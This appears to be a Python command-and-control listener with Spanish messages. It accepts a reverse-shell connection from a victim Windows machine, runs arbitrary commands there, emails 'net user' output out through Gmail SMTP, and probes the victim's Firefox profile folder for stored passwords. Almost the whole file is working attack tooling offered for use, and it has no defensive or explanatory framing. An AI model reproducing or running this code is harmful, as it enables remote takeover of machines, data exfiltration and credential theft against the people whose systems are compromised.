#!/usr/bin/env python3

import socket
import signal
import sys
import smtplib
from termcolor import colored
from email.mime.text import MIMEText


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo del programa...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:

    def __init__(self, ip, port):
        self.options = {"get users": "List system valid users (Gmail)", "get firefox": "Get Firefox Stored Passwords", "help": "Show is help panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("192.168.1.58", 443))
        server_socket.listen()

        print(f"\n[+] Listening for incomming connections...")

        self.client_socket, client_address = server_socket.accept()

        print(f"\n[+] Connection established by {client_address}\n")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
           smtp_server.login(sender, password)
           smtp_server.sendmail(sender, recipients, msg.as_string()
                               )
        print(f"\n[+] Email sent Successfully!\n")

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()

        self.send_email("Users List INFO - C2", output_command, "mail@gmail.com", ["mail@gmail.com"], "token")

    def show_help(self):
        for key, value in self.options.items():
            print(f"{key} - {value}\n")

    def get_firefox_passwords(self):
        self.client_socket.send(b"dir C:\\Users\\NameUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

    def run(self):
        while True:
            command = input(">> ")

            if command == "get_users":
                self.get_users()
            elif command == "get firefox":
                self.get_firefox_passwords()
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("ip-atacante", 443)
    my_listener.run()

